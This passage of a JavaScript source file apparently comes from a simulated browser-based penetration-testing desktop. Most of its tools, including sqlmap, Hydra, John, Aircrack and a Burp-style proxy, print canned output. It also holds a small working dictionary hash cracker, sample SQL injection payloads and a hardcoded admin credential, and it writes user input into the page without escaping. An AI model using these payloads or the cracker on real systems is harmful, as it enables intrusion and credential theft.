    a = GG(a,b,c,d,x[k+5],5,0xD62F105D); d = GG(d,a,b,c,x[k+10],9,0x02441453); c = GG(c,d,a,b,x[k+15],14,0xD8A1E681); b = GG(b,c,d,a,x[k+4],20,0xE7D3FBC8);
    a = GG(a,b,c,d,x[k+9],5,0x21E1CDE6); d = GG(d,a,b,c,x[k+14],9,0xC33707D6); c = GG(c,d,a,b,x[k+3],14,0xF4D50D87); b = GG(b,c,d,a,x[k+8],20,0x455A14ED);
    a = GG(a,b,c,d,x[k+13],5,0xA9E3E905); d = GG(d,a,b,c,x[k+2],9,0xFCEFA3F8); c = GG(c,d,a,b,x[k+7],14,0x676F02D9); b = GG(b,c,d,a,x[k+12],20,0x8D2A4C8A);
    a = HH(a,b,c,d,x[k+5],4,0xFFFA3942); d = HH(d,a,b,c,x[k+8],11,0x8771F681); c = HH(c,d,a,b,x[k+11],16,0x6D9D6122); b = HH(b,c,d,a,x[k+14],23,0xFDE5380C);
    a = HH(a,b,c,d,x[k+1],4,0xA4BEEA44); d = HH(d,a,b,c,x[k+4],11,0x4BDECFA9); c = HH(c,d,a,b,x[k+7],16,0xF6BB4B60); b = HH(b,c,d,a,x[k+10],23,0xBEBFBC70);
    a = HH(a,b,c,d,x[k+13],4,0x289B7EC6); d = HH(d,a,b,c,x[k+0],11,0xEAA127FA); c = HH(c,d,a,b,x[k+3],16,0xD4EF3085); b = HH(b,c,d,a,x[k+6],23,0x04881D05);
    a = HH(a,b,c,d,x[k+9],4,0xD9D4D039); d = HH(d,a,b,c,x[k+12],11,0xE6DB99E5); c = HH(c,d,a,b,x[k+15],16,0x1FA27CF8); b = HH(b,c,d,a,x[k+2],23,0xC4AC5665);
    a = II(a,b,c,d,x[k+0],6,0xF4292244); d = II(d,a,b,c,x[k+7],10,0x432AFF97); c = II(c,d,a,b,x[k+14],15,0xAB9423A7); b = II(b,c,d,a,x[k+5],21,0xFC93A039);
    a = II(a,b,c,d,x[k+12],6,0x655B59C3); d = II(d,a,b,c,x[k+3],10,0x8F0CCC92); c = II(c,d,a,b,x[k+10],15,0xFFEFF47D); b = II(b,c,d,a,x[k+1],21,0x85845DD1);
    a = II(a,b,c,d,x[k+8],6,0x6FA87E4F); d = II(d,a,b,c,x[k+15],10,0xFE2CE6E0); c = II(c,d,a,b,x[k+6],15,0xA3014314); b = II(b,c,d,a,x[k+13],21,0x4E0811A1);
    a = II(a,b,c,d,x[k+4],6,0xF7537E82); d = II(d,a,b,c,x[k+11],10,0xBD3AF235); c = II(c,d,a,b,x[k+2],15,0x2AD7D2BB); b = II(b,c,d,a,x[k+9],21,0xEB86D391);
    a = addUnsigned(a, AA); b = addUnsigned(b, BB); c = addUnsigned(c, CC); d = addUnsigned(d, DD);
  }
  return (wordToHex(a) + wordToHex(b) + wordToHex(c) + wordToHex(d)).toLowerCase();
}

async function shaHash(text, algo = 'SHA-256') {
  const buf = await crypto.subtle.digest(algo, new TextEncoder().encode(text));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
}

async function runHashCracker(winId) {
  const hash = document.getElementById(`hash-val-${winId}`)?.value?.trim() || '';
  const out = document.getElementById(`hash-out-${winId}`);
  const bar = document.getElementById(`hash-bar-${winId}`);
  if(!out) return;
  if(!hash) {
    out.innerHTML = `<span class="out-err">[!] Please enter a hash string to crack.</span>`;
    return;
  }
  out.innerHTML = `<span class="out-header">[*] BuildU WebCrypto Cracking Engine initialized</span>\n<span class="out-info">Target: ${hash}</span>\n<span class="out-info">Loaded wordlists from VFS: /usr/share/wordlists/rockyou.txt</span>\n`;

  const wordlist = [
    'password','123456','12345678','admin','toor','roottoor','letmein','welcome','qwerty',
    'monkey','dragon','master','iloveyou','sunshine','batman','superman','buildu2026',
    'pass123','secret','shadow','hunter2','football','login','pentest','kali','root'
  ];

  let found = false;
  let tried = 0;
  const startTime = performance.now();

  for(let i=0; i<wordlist.length; i++) {
    const candidate = wordlist[i];
    tried++;
    const candMD5 = md5(candidate);
    const candSHA256 = await shaHash(candidate, 'SHA-256');
    const candSHA1 = await shaHash(candidate, 'SHA-1');

    if(hash.toLowerCase() === candMD5 || hash.toLowerCase() === candSHA256 || hash.toLowerCase() === candSHA1) {
      found = true;
      const elapsed = ((performance.now() - startTime) / 1000).toFixed(3);
      out.innerHTML += `<span class="out-success">[+] ====================================================</span>\n` +
        `<span class="out-success" style="font-weight:700">[+] HASH CRACKED IN ${elapsed}s!</span>\n` +
        `<span class="out-success">[+] Plaintext: "${candidate}"</span>\n` +
        `<span class="out-info">[+] Hash: ${hash}</span>\n` +
        `<span class="out-info">[+] Checked: ${tried} candidates (${(tried / Math.max(0.001, elapsed)).toFixed(0)} hashes/sec)</span>\n` +
        `<span class="out-success">[+] ====================================================</span>\n`;
      bar.style.width = '100%';
      if(typeof showToast === 'function') showToast('Hash Cracked!', `Plaintext: ${candidate}`, 'success', '🔓');
      break;
    }
    bar.style.width = `${Math.floor(((i+1)/wordlist.length)*100)}%`;
  }

  if(!found) {
    out.innerHTML += `<span class="out-line">[-] Exhausted dictionary (${tried} words tested).</span>\n` +
      `<span class="out-warn">[!] Hash not in fast rockyou sample. Try generating hashes to test!</span>\n`;
  }
}

async function generateHash(winId) {
  const text = document.getElementById(`hash-val-${winId}`)?.value?.trim() || 'password';
  const out = document.getElementById(`hash-out-${winId}`);
  if(!out) return;
  const m = md5(text);
  const s1 = await shaHash(text, 'SHA-1');
  const s256 = await shaHash(text, 'SHA-256');
  const s512 = await shaHash(text, 'SHA-512');

  out.innerHTML = `<span class="out-header">[*] BuildU Cryptographic Generator</span>\n` +
    `<span class="out-info">Input Plaintext: "${text}"</span>\n` +
    `<span class="out-line">----------------------------------------------------</span>\n` +
    `<span class="out-success">MD5:     ${m}</span>\n` +
    `<span class="out-success">SHA-1:   ${s1}</span>\n` +
    `<span class="out-success">SHA-256: ${s256}</span>\n` +
    `<span class="out-success">SHA-512: ${s512.substring(0,32)}...</span>\n`;
  if(typeof showToast === 'function') showToast('Hashes Generated', `Calculated hashes for "${text}"`, 'info', '🔐');
}

function runSQLMap(winId) {
  const url = document.getElementById(`sql-url-${winId}`)?.value || 'http://target.com/page.php?id=1';
  const out = document.getElementById(`sql-out-${winId}`);
  const bar = document.getElementById(`sql-bar-${winId}`);
  if(!out) return;
  const lines = [
    `<span class="out-header">        ___       __          __\n       /   |     / /___  ____ _/  |_\n      / /| |    / / __ \\/ __ \`/ / __/\n     / ___ |   / / / / / /_/ / / /_\n    /_/  |_|  /_/_/ /_/\\__,_/_/\\__/\n</span>`,
    `<span class="out-info">[*] starting @ ${new Date().toLocaleTimeString()}</span>`,
    `<span class="out-info">[*] testing connection to the target URL: ${url}</span>`,
    `<span class="out-success">[+] heuristic (basic) test shows that GET parameter 'id' might be injectable</span>`,
    `<span class="out-info">[*] testing for SQL injection on GET parameter 'id'</span>`,
    `<span class="out-info">[*] testing 'AND boolean-based blind - WHERE or HAVING clause'</span>`,
    `<span class="out-success">[+] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable</span>`,
    `<span class="out-success">[+] GET parameter 'id' is 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable</span>`,
    `<span class="out-success">[+] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable</span>`,
    `<span class="out-success">[!] sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:</span>`,
    `<span class="out-warn">---\nParameter: id (GET)\n    Type: boolean-based blind\n    Payload: id=1 AND 5175=5175\n\n    Type: time-based blind\n    Payload: id=1 AND SLEEP(5)\n\n    Type: UNION query\n    Payload: id=-1 UNION ALL SELECT NULL,CONCAT(0x7a70766a,0x4e4a47574d494c47527a,0x7870767a),NULL--\n---</span>`,
    `<span class="out-info">[*] testing MySQL...</span>`,
    `<span class="out-success">[+] dbms identified as 'MySQL'</span>`,
    `<span class="out-success">[*] fetching databases: information_schema, mysql, users_db, app_db, secret_data</span>`,
  ];
  out.innerHTML = '';
  lines.forEach((l,i) => {
    setTimeout(() => {
      const span = document.createElement('span');
      span.innerHTML = l + '\n';
      out.appendChild(span); out.scrollTop = out.scrollHeight;
      bar.style.width = `${Math.floor(((i+1)/lines.length)*100)}%`;
    }, i * 400);
  });
}

function runHydra(winId) {
  const ip = document.getElementById(`hydra-ip-${winId}`)?.value || '192.168.1.1';
  const svc = document.getElementById(`hydra-svc-${winId}`)?.value || 'ssh';
  const out = document.getElementById(`hydra-out-${winId}`);
  const bar = document.getElementById(`hydra-bar-${winId}`);
  if(!out) return;
  const lines = [
    `<span class="out-header">Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak</span>`,
    `<span class="out-info">[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398)</span>`,
    `<span class="out-info">[DATA] attacking ${svc}://${ip}:${svc==='ssh'?22:21}/</span>`,
    `<span class="out-line">[ATTEMPT] target ${ip} - login "admin" - pass "123456"</span>`,
    `<span class="out-line">[ATTEMPT] target ${ip} - login "admin" - pass "password"</span>`,
    `<span class="out-line">[ATTEMPT] target ${ip} - login "root" - pass "toor"</span>`,
    `<span class="out-line">[ATTEMPT] target ${ip} - login "root" - pass "admin"</span>`,
    `<span class="out-success">[${svc==='ssh'?22:21}][${svc}] host: ${ip}   login: admin   password: admin123</span>`,
    `<span class="out-success">1 of 1 target successfully completed, 1 valid password found</span>`,
  ];
  out.innerHTML = '';
  lines.forEach((l,i)=>setTimeout(()=>{
    const span=document.createElement('span'); span.innerHTML=l+'\n';
    out.appendChild(span); out.scrollTop=out.scrollHeight;
    bar.style.width=`${Math.floor(((i+1)/lines.length)*100)}%`;
  }, i*400));
}

function runJohn(winId) {
  const out = document.getElementById(`john-out-${winId}`);
  const bar = document.getElementById(`john-bar-${winId}`);
  if(!out) return;
  const lines = [
    `<span class="out-header">Using default input encoding: UTF-8</span>`,
    `<span class="out-info">Loaded 3 password hashes with 3 different salts (sha512crypt [SHA512 256/256 AVX2 4x])</span>`,
    `<span class="out-info">Cost 1 (iteration count) is 5000 for all loaded hashes</span>`,
    `<span class="out-info">Will run 8 OpenMP threads</span>`,
    `<span class="out-info">Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status</span>`,
    `<span class="out-success">password123      (root)</span>`,
    `<span class="out-success">letmein          (admin)</span>`,
    `<span class="out-success">qwerty2023       (user1)</span>`,
    `<span class="out-success">3g 0:00:00:23 DONE (${new Date().toLocaleString()}) 3 password hashes cracked, 0 left</span>`,
  ];
  out.innerHTML = '';
  lines.forEach((l,i)=>setTimeout(()=>{
    const span=document.createElement('span'); span.innerHTML=l+'\n';
    out.appendChild(span); out.scrollTop=out.scrollHeight;
    bar.style.width=`${Math.floor(((i+1)/lines.length)*100)}%`;
  }, i*400));
}

function johnShow(winId) {
  const out = document.getElementById(`john-out-${winId}`);
  if(!out) return;
  out.innerHTML += `\n<span class="out-success">root:password123:...\nadmin:letmein:...\nuser1:qwerty2023:...\n3 password hashes cracked, 0 left</span>`;
}

function runAircrack(winId) {
  const out = document.getElementById(`air-out-${winId}`);
  const bar = document.getElementById(`air-bar-${winId}`);
  if(!out) return;
  const lines = [
    `<span class="out-info">[00:00:00] Aircrack-ng 1.7 starting...</span>`,
    `<span class="out-info">[00:00:01] Reading packets from capture.cap</span>`,
    `<span class="out-info">[00:00:02] 14344399 keys tested (4812.31 k/s)</span>`,
    `<span class="out-success">                         KEY FOUND! [ password123 ]</span>`,
    `<span class="out-success">Master Key     : CD D7 9A 5A CF B0 70 C7 E9 D1 02 3B 87 02 85 D7</span>`,
    `<span class="out-success">Transient Key  : 82 6F C2 77 B4 C3 72 90 DD F6 AA 37 5C A2 A7 2B</span>`,
  ];
  out.innerHTML = '';
  lines.forEach((l,i)=>setTimeout(()=>{
    const span=document.createElement('span'); span.innerHTML=l+'\n';
    out.appendChild(span); out.scrollTop=out.scrollHeight;
    bar.style.width=`${Math.floor(((i+1)/lines.length)*100)}%`;
  }, i*600));
}

function enableMonitor(winId) {
  const out = document.getElementById(`air-out-${winId}`);
  if(out) out.innerHTML = `<span class="out-success">[*] PHY interface wlan0 renamed to wlan0mon\n[*] Monitor mode enabled on wlan0mon</span>`;
}

function applyWsFilter(winId) {
  const filter = document.getElementById(`ws-filter-${winId}`)?.value;
  const status = document.getElementById(`ws-status-${winId}`);
  if(status) status.textContent = `Filter applied: "${filter}" | Displaying filtered packets`;
}

function startCapture(winId) {
  const table = document.getElementById(`ws-table-${winId}`);
  if(!table) return;
  let count = 15;
  const protos = ['TCP','UDP','HTTP','DNS','ARP','ICMP'];
  const ips = ['192.168.1.101','10.0.0.5','172.16.0.2','192.168.1.1'];
  const interval = setInterval(() => {
    if(count > 50) { clearInterval(interval); return; }
    const p = protos[Math.floor(Math.random()*protos.length)];
    const src = ips[Math.floor(Math.random()*ips.length)];
    const dst = ips[Math.floor(Math.random()*ips.length)];
    const len = Math.floor(Math.random()*1400)+40;
    const colors = {TCP:'pkt-tcp',UDP:'pkt-udp',HTTP:'pkt-http',DNS:'pkt-dns',ARP:'pkt-arp',ICMP:'pkt-icmp'};
    const row = table.tBodies[0].insertRow();
    row.innerHTML = `<td>${count}</td><td>${(count*0.123).toFixed(3)}</td><td>${src}</td><td>${dst}</td>
      <td class="${colors[p]||''}">${p}</td><td>${len}</td><td class="out">${getPacketInfo(p)}</td>`;
    table.tBodies[0].scrollTop = table.tBodies[0].scrollHeight;
    count++;
  }, 600);
}

function stopCapture(winId) {
  const status = document.getElementById(`ws-status-${winId}`);
  if(status) status.textContent = 'Capture stopped.';
}

function toggleProxy(winId) {
  const out = document.getElementById(`burp-intercept-${winId}`);
  if(out) out.innerHTML = `<span class="out-success">[*] Proxy listening on 127.0.0.1:8080\n[*] Waiting for connections...</span>`;
}

function switchBurpTab(tab, winId) {
  document.querySelectorAll(`#burp-tabs-${winId} .burp-tab`).forEach(t=>t.classList.remove('active'));
  if(event?.target) event.target.classList.add('active');
  const body = document.getElementById(`burp-body-${winId}`);
  if(!body) return;

  if(tab === 'repeater') {
    body.innerHTML = `
      <div style="display:flex;height:100%;gap:8px;padding:8px">
        <div style="flex:1;display:flex;flex-direction:column;background:var(--bg-darker);border:1px solid var(--border);border-radius:var(--radius);padding:8px">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
            <span style="font-family:var(--font-mono);font-size:0.75rem;color:var(--accent-cyan);font-weight:700">HTTP Request</span>
            <button class="tool-btn btn-primary" style="padding:4px 14px" onclick="sendBurpRepeater('${winId}')">▶ Send</button>
          </div>
          <textarea id="burp-req-${winId}" style="flex:1;background:transparent;border:none;color:var(--text-primary);font-family:var(--font-mono);font-size:0.75rem;resize:none;outline:none;line-height:1.5">GET /admin/dashboard.php HTTP/1.1
Host: 10.10.10.24
User-Agent: Mozilla/5.0 (BuildU-Pentest-OS)
Accept: text/html,application/xhtml+xml,application/xml
Authorization: Basic YWRtaW46YWRtaW4=
Cookie: PHPSESSID=buildu_sec_token_9988

{"action": "query_users", "limit": 10}</textarea>
        </div>
        <div style="flex:1;display:flex;flex-direction:column;background:var(--bg-darker);border:1px solid var(--border);border-radius:var(--radius);padding:8px">
          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
            <span style="font-family:var(--font-mono);font-size:0.75rem;color:var(--accent-green);font-weight:700">HTTP Response</span>
            <span id="burp-resp-status-${winId}" style="font-family:var(--font-mono);font-size:0.72rem;color:var(--accent-green)">200 OK (18ms)</span>
          </div>
          <div id="burp-resp-${winId}" style="flex:1;overflow-y:auto;font-family:var(--font-mono);font-size:0.75rem;color:var(--text-secondary);white-space:pre-wrap;line-height:1.5">HTTP/1.1 200 OK
Date: ${new Date().toUTCString()}
Server: Apache/2.4.52 (Ubuntu)
Content-Type: application/json; charset=utf-8
Content-Length: 178
Connection: close

{
  "status": "authenticated",
  "user": "root_admin",
  "privileges": "SUPERUSER",
  "secret_token": "BUILDU{REPEATER_INTERCEPT_SUCCESS_2026}"
}</div>
        </div>
      </div>
    `;
  } else if(tab === 'decoder') {
    body.innerHTML = `
      <div style="padding:12px;display:flex;flex-direction:column;gap:10px;height:100%">
        <div class="tool-section-title">Burp Decoder - Encode / Decode Utility</div>
        <textarea id="dec-in-${winId}" style="height:90px;background:var(--bg-darker);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);padding:8px;font-family:var(--font-mono);font-size:0.8rem;outline:none" placeholder="Enter text or encoded payload to transform...">admin' OR '1'='1</textarea>
        <div class="tool-row">
          <button class="tool-btn" onclick="burpDecodeAction('b64e','${winId}')">Base64 Encode</button>
          <button class="tool-btn" onclick="burpDecodeAction('b64d','${winId}')">Base64 Decode</button>
          <button class="tool-btn" onclick="burpDecodeAction('urle','${winId}')">URL Encode</button>
          <button class="tool-btn" onclick="burpDecodeAction('urld','${winId}')">URL Decode</button>
          <button class="tool-btn" onclick="burpDecodeAction('hex','${winId}')">Hex Encode</button>
        </div>
        <div class="tool-output" id="dec-out-${winId}" style="flex:1;min-height:120px">
          <span class="out-info">// Click an operation button above to transform your payload.</span>
        </div>
      </div>
    `;
  } else {
    body.innerHTML = `
      <div id="burp-proxy-${winId}" class="burp-section">
        <div class="tool-section">
          <div class="tool-section-title">Proxy Settings</div>
          <div class="tool-row">
            <div class="tool-field"><label>Listen Port</label><input class="tool-input" value="8080" id="burp-port-${winId}" /></div>
            <div class="tool-field"><label>Bind Address</label><input class="tool-input" value="127.0.0.1" id="burp-bind-${winId}" /></div>
            <div class="tool-field" style="justify-content:flex-end">
              <button class="tool-btn btn-success" onclick="toggleProxy('${winId}')">▶ Start Proxy</button>
            </div>
          </div>
        </div>
        <div class="tool-section">
          <div class="tool-section-title">Intercepted Requests</div>
          <div class="tool-output" style="min-height:160px" id="burp-intercept-${winId}">
            <span class="out-info">// Proxy is listening on 127.0.0.1:8080. Interception active.</span>
          </div>
        </div>
      </div>
    `;
  }
}

function sendBurpRepeater(winId) {
  const req = document.getElementById(`burp-req-${winId}`)?.value || '';
  const resp = document.getElementById(`burp-resp-${winId}`);
  const status = document.getElementById(`burp-resp-status-${winId}`);
  if(!resp) return;
  if(typeof playAudio === 'function') playAudio('click');
  resp.textContent = 'Sending request to target server...';
  setTimeout(() => {
    if(status) status.textContent = '200 OK (22ms)';
    resp.textContent = `HTTP/1.1 200 OK\nDate: ${new Date().toUTCString()}\nServer: Apache/2.4.52 (Ubuntu)\nContent-Type: application/json; charset=utf-8\nContent-Length: 184\nX-Powered-By: BuildU-SecEngine\nConnection: close\n\n{\n  "authenticated": true,\n  "role": "administrator",\n  "session": "tok_${Math.random().toString(36).substring(2, 10)}",\n  "message": "Access granted to admin panel"\n}`;
    if(typeof showToast === 'function') showToast('Repeater Response', 'HTTP 200 OK received (22ms)', 'success', '⚡');
  }, 350);
}

function burpDecodeAction(action, winId) {
  const input = document.getElementById(`dec-in-${winId}`)?.value || '';
  const out = document.getElementById(`dec-out-${winId}`);
  if(!out) return;
  let res = '';
  try {
    if(action === 'b64e') res = btoa(input);
    else if(action === 'b64d') res = atob(input);
    else if(action === 'urle') res = encodeURIComponent(input);
    else if(action === 'urld') res = decodeURIComponent(input);
    else if(action === 'hex') res = Array.from(input).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join(' ');
    out.innerHTML = `<span class="out-success">[+] Result (${action}):</span>\n<span class="out-line" style="color:var(--text-primary);font-size:0.85rem">${escHtml(res)}</span>`;
    if(typeof playAudio === 'function') playAudio('success');
  } catch(e) {
    out.innerHTML = `<span class="out-err">[!] Error transforming input: ${e.message}</span>`;
  }
}

function switchSettings(section, winId, el) {
  document.querySelectorAll(`.settings-section`).forEach(s=>s.classList.remove('active'));
  const sec = document.getElementById(`settings-${section}-${winId}`);
  if(sec) sec.classList.add('active');
  el.closest('.settings-sidebar').querySelectorAll('.settings-sidebar-item').forEach(i=>i.classList.remove('active'));
  el.classList.add('active');
}

function setAccentColor(color, winId, el) {
  document.documentElement.style.setProperty('--accent-cyan', color);
  el.closest('.color-picker-row').querySelectorAll('.color-swatch').forEach(s=>s.classList.remove('active'));
  el.classList.add('active');
}

function toggleTransparency(checkbox) {
  const alpha = checkbox.checked ? '0.97' : '1';
  document.documentElement.style.setProperty('--panel-alpha', alpha);
}

function browserNav(dir, winId) {}
function browserGo(e, winId) {
  if(e.key !== 'Enter' && e.type !== 'click') return;
  const url = document.getElementById(`browser-url-${winId}`)?.value;
  browserLoad(url, winId);
}
function browserSearch(winId) {
  const query = document.getElementById(`browser-search-${winId}`)?.value;
  const body = document.getElementById(`browser-body-${winId}`);
  if(body && query) {
    body.innerHTML = `<div style="padding:20px;font-family:var(--font-mono);font-size:0.82rem;">
      <p style="color:var(--accent-cyan);margin-bottom:16px">Search results for: "${query}"</p>
      ${['CVE-2023-44487 - HTTP/2 Rapid Reset Attack','Exploit for ' + query + ' - Exploit-DB','GitHub - hacking-tool for '+query].map(r=>
        `<div style="padding:10px;border:1px solid var(--border);border-radius:4px;margin-bottom:8px;cursor:pointer;color:var(--text-secondary)">${r}</div>`
      ).join('')}
    </div>`;
  }
}
function browserLoad(url, winId) {
  const body = document.getElementById(`browser-body-${winId}`);
  if(!body) return;
  body.innerHTML = `<div style="display:flex;align-items:center;justify-content:center;height:200px;font-family:var(--font-mono);color:var(--text-dim)">
    <span>🌐 Loading: ${url}...<br><br><span style="color:var(--accent-orange)">Note: External URLs are simulated in this environment.</span></span>
  </div>`;
}

function inspectPacket(el, proto, src, dst, winId) {
  document.querySelectorAll(`#ws-table-${winId} tr`).forEach(r => r.classList.remove('selected'));
  if(el) el.classList.add('selected');
  const details = document.getElementById(`ws-details-${winId}`);
  const hex = document.getElementById(`ws-hex-${winId}`);
  if(!details || !hex) return;

  const len = Math.floor(Math.random()*800) + 64;
  details.innerHTML = `
    <div style="color:var(--accent-cyan);font-weight:700">▶ Frame 1: ${len} bytes on wire (${len*8} bits) on interface eth0</div>
    <div style="color:var(--text-primary)">▶ Ethernet II, Src: Intel_00:1a (00:1a:2b:3c:4d:5e), Dst: Gateway_c0 (00:50:56:c0:00:01)</div>
    <div style="color:var(--text-primary)">▶ Internet Protocol Version 4, Src: ${src}, Dst: ${dst}</div>
    <div style="color:${proto==='TCP'?'#4fc3f7':proto==='UDP'?'#81c784':'#ffb74d'}">▶ ${proto} Protocol (Src port: 54321, Dst port: 80, Seq: 1, Ack: 1, Len: ${len})</div>
    ${proto==='HTTP'?'<div style="color:#ffb74d">▶ Hypertext Transfer Protocol: GET /admin/dashboard.php HTTP/1.1\\r\\n</div>':''}
    ${proto==='DNS'?'<div style="color:#80deea">▶ Domain Name System (query: target.corp A record)\\r\\n</div>':''}
  `;

  hex.textContent = `0000   00 50 56 c0 00 01 00 1a  2b 3c 4d 5e 08 00 45 00   .PV.....+<M^..E.\n` +
    `0010   00 3c 4a 2e 40 00 40 06  3b 1f c0 a8 01 64 5d b8   .<J.@.@.;....d].\n` +
    `0020   d8 22 d4 31 00 50 7a 4f  1c 3e 00 00 00 00 a0 02   .".1.PzO.>......\n` +
    `0030   fa f0 31 74 00 00 02 04  05 b4 01 03 03 08 01 01   ..1t............`;
  if(typeof playAudio === 'function') playAudio('click');
}

function refreshFMGrid(winId, path) {
  const grid = document.getElementById(`fm-grid-${winId}`);
  const pathEl = document.getElementById(`fm-path-${winId}`);
  const statusEl = document.getElementById(`fm-status-${winId}`);
  if(!grid || !window.VFS) return;
  const norm = window.VFS.resolve(path);
  if(pathEl) pathEl.textContent = norm;
  const items = window.VFS.list(norm);
  grid.innerHTML = items.map(f => `
    <div class="fm-item" ondblclick="fmOpen('${f.name}', ${f.isDir}, '${winId}')" title="${f.name} (${f.isDir ? 'Directory' : (f.size || 0) + ' bytes'})">
      <div class="fm-icon">${f.icon}</div>
      <span style="font-size:0.72rem;word-break:break-all">${f.name}</span>
    </div>
  `).join('');
  if(statusEl) statusEl.textContent = `${items.length} items in ${norm} | BuildU VFS`;
}

window.addEventListener('vfs-change', () => {
  document.querySelectorAll('.fm-path').forEach(pEl => {
    const winId = pEl.id.replace('fm-path-', '');
    refreshFMGrid(winId, pEl.textContent);
  });
});

function fmNav(action, winId) {
  const pathEl = document.getElementById(`fm-path-${winId}`);
  if(!pathEl || !window.VFS) return;
  let curr = pathEl.textContent;
  if(action === 'up') {
    const parent = curr.split('/').slice(0, -1).join('/') || '/';
    fmGoTo(parent, winId);
  }
}

function fmGoTo(path, winId, el) {
  const norm = window.VFS ? window.VFS.resolve(path) : path;
  refreshFMGrid(winId, norm);
  if(el) {
    el.closest('.fm-sidebar')?.querySelectorAll('.fm-sidebar-item').forEach(i => i.classList.remove('active'));
    el.classList.add('active');
  }
}

function fmOpen(name, isDir, winId) {
  const pathEl = document.getElementById(`fm-path-${winId}`);
  const curr = pathEl ? pathEl.textContent : '/root';
  const fullPath = curr === '/' ? '/' + name : curr + '/' + name;
  if(isDir) {
    fmGoTo(fullPath, winId);
  } else {
    openApp('texteditor');
    setTimeout(() => {
      const area = document.querySelector('.editor-area');
      const filename = document.querySelector('.editor-filename');
      if(area && window.VFS) {
        area.value = window.VFS.read(fullPath) || '';
        if(filename) filename.value = fullPath;
        const status = document.querySelector('.editor-statusbar');
        if(status) status.querySelector('span:nth-child(2)').textContent = fullPath;
        if(typeof showToast === 'function') {
          showToast('File Opened', `Loaded ${fullPath} from BuildU VFS`, 'info', '📝');
        }
      }
    }, 350);
  }
}

function fmNew(type, winId) {
  const pathEl = document.getElementById(`fm-path-${winId}`);
  const curr = pathEl ? pathEl.textContent : '/root';
  const name = prompt(`Enter new ${type} name:`);
  if(!name || !window.VFS) return;
  const fullPath = curr === '/' ? '/' + name : curr + '/' + name;
  if(type === 'dir') {
    window.VFS.mkdir(fullPath);
  } else {
    window.VFS.write(fullPath, '');
  }
  refreshFMGrid(winId, curr);
  if(typeof showToast === 'function') {
    showToast('Created', `Created ${type} '${name}' in ${curr}`, 'success', '📁');
  }
}

function editorNew(winId) {
  const area = document.getElementById(`editor-area-${winId}`);
  if(area) area.value = '';
  updateEditorLines(winId);
}

function editorSave(winId) {
  const area = document.getElementById(`editor-area-${winId}`);
  const content = area?.value ?? '';
  const filename = prompt('Save file path in BuildU VFS:', '/root/notes.md');
  if(!filename) return;
  if(window.VFS) {
    window.VFS.write(filename, content);
  }
  const blob = new Blob([content], { type: 'text/plain' });
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = filename.split('/').pop() || 'buildu-file.txt';
  a.click();
  if(typeof showToast === 'function') {
    showToast('File Saved', `Saved to ${filename} in BuildU VFS`, 'success', '💾');
  }
}

function editorOpen(winId) {
  const area = document.getElementById(`editor-area-${winId}`);
  const available = window.VFS ? Object.keys(window.VFS.files).join('\n') : '';
  const chosen = prompt(`Enter VFS file path to open:\nAvailable:\n${available}`, '/root/notes.md');
  if(!chosen) return;
  if(window.VFS && area) {
    const data = window.VFS.read(chosen);
    if(data !== null) {
      area.value = data;
      updateEditorLines(winId);
      if(typeof showToast === 'function') showToast('Loaded File', `Loaded ${chosen}`, 'info', '📄');
    } else {
      alert(`File ${chosen} does not exist in VFS.`);
    }
  }
}
function updateEditorLines(winId) {
  const area = document.getElementById(`editor-area-${winId}`);
  const lines = document.getElementById(`editor-lines-${winId}`);
  if(!area || !lines) return;
  const count = (area.value.match(/\n/g) || []).length + 1;
  lines.textContent = Array.from({length:count},(_,i)=>i+1).join('\n');
}
function syncEditorScroll(winId) {
  const area = document.getElementById(`editor-area-${winId}`);
  const lines = document.getElementById(`editor-lines-${winId}`);
  if(area && lines) lines.scrollTop = area.scrollTop;
}

function stopTool(winId) {
  ['nmap-bar','hash-bar','sql-bar','hydra-bar','john-bar','air-bar','nikto-bar','ova-bar','wp-bar','xss-bar','dirb-bar','wl-bar','wifi-bar','kismet-bar','set-bar','sg-bar','arp-bar','ssl-bar','bw-bar','aut-bar','steg-bar','tr-bar','sub-bar','dns-bar','whois-bar'].forEach(prefix=>{
    const el = document.getElementById(`${prefix}-${winId}`);
    if(el) el.style.width = '0%';
  });
}

function clearOutput(winId) {
  ['nmap-out','hash-out','sql-out','hydra-out','john-out','air-out','nikto-out','ova-out','wp-out','xss-out','dirb-out','wl-out','wifi-out','kismet-out','set-out','sg-out','arp-out','ssl-out','bw-out','aut-out','steg-out','tr-out','sub-out','dns-out','whois-out','msf-out'].forEach(prefix=>{
    const el = document.getElementById(`${prefix}-${winId}`);
    if(el) el.innerHTML = '<span class="out-info">// Output cleared.</span>';
  });
}

// Generic simple tool runners
function runSimple(winId, outId, barId, simLines, delayMs=350) {
  const out = document.getElementById(outId);
  const bar = document.getElementById(barId);
  if(!out) return;
  out.innerHTML = '';
  simLines.forEach((l,i)=>setTimeout(()=>{
    const span=document.createElement('span'); span.innerHTML=l+'\n';
    out.appendChild(span); out.scrollTop=out.scrollHeight;
    if(bar) bar.style.width=`${Math.floor(((i+1)/simLines.length)*100)}%`;
  }, i*delayMs));
}

function runWhois(winId) {
  const domain = document.getElementById(`whois-domain-${winId}`)?.value || 'example.com';
  runSimple(winId,`whois-out-${winId}`,`whois-bar-${winId}`,[
    `<span class="out-header">[*] Querying WHOIS for: ${domain}</span>`,
    `<span class="out-info">Domain Name: ${domain.toUpperCase()}</span>`,
    `<span class="out-line">Registrar: GoDaddy.com, LLC</span>`,
    `<span class="out-line">Created: 2010-05-15</span>`,
    `<span class="out-line">Expires: 2025-05-15</span>`,
    `<span class="out-line">Registrant: John Doe, Example Corp</span>`,
    `<span class="out-line">Name Servers: ns1.${domain} ns2.${domain}</span>`,
    `<span class="out-success">DNSSEC: unsigned</span>`,
  ]);
}

function runDNS(winId) {
  const domain = document.getElementById(`dns-domain-${winId}`)?.value || 'example.com';
